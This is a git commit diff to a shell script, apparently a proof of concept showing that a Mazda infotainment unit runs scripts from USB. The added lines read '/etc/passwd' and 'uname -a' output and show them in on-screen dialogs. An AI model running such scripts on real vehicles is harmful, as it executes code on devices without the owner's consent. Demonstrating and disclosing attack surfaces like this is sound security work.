381f69195e5130c17e7ac70c0f4f3eb0ff019138
Jay Turla <shipcodez@gmail.com>
2017-06-06 15:53:31 +0800

    Update info.sh

--- info.sh
+++ info.sh
@@ -2,7 +2,25 @@
 # @shipcod3
 # credits goes to http://mazdatweaks.com/ for the wonderful Mazda hacks :)
 
-/jci/tools/jci-dialog --title="Shoutz to ROOTCON" --text="Jay Turla will be improving this script soon" --ok-label='OK' --no-cancel
+/jci/tools/jci-dialog --title="PoC" --text="A PoC that USB is an attack surface" --ok-label='OK' --no-cancel
+/jci/tools/jci-dialog --title="gr33tz" --text="To ROOTCON family" --ok-label='OK' --no-cancel
+
+get_uname()
+{
+	_uname=$(/bin/uname -a)
+	echo "${_uname}"
+}
+
+get_passwd()
+{
+	_passwd=$(/bin/cat /etc/passwd)
+	echo "${_passwd}"
+}
+
+GET_UNAME=$(get_uname)
+GET_PASSWD=$(get_passwd)
+/jci/tools/jci-dialog --title="Executing uname -a" --text="${GET_UNAME}" --ok-label='OK' --no-cancel
+/jci/tools/jci-dialog --title="Executing cat /etc/passwd" --text="${GET_PASSWD}" --ok-label='OK' --no-cancel
 
 sleep 10
 
